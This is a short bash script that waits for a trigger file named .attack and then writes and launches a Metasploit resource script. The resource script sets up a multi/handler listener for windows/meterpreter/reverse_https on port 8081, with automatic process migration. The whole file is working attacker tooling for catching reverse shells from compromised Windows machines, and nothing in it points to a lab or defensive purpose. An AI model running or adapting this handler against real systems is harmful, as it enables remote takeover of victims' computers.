#!/usr/bin/env bash

LBlue='\033[0;94m'      # Light Blue
BBlue='\033[1;34m'      # Bold Blue
BWhite='\033[1;37m'     # Bold White
Color_Off='\033[0m'     # Text Reset

tput civis

while [ ! -f .attack ]; do
    clear
    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Reverse Shell...${Color_Off}\n"
    sleep 5
done

tput cnorm

# Get the local IP address
LHOST=$(ip route get 1 | awk '{print $7; exit}')

# Generate the Metasploit resource script
cat <<EOF > msf_handler.rc
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT 8081
set AutoRunScript post/windows/manage/migrate
set VERBOSE true
run
EOF

# Run Metasploit with the generated resource script
msfconsole -r msf_handler.rc
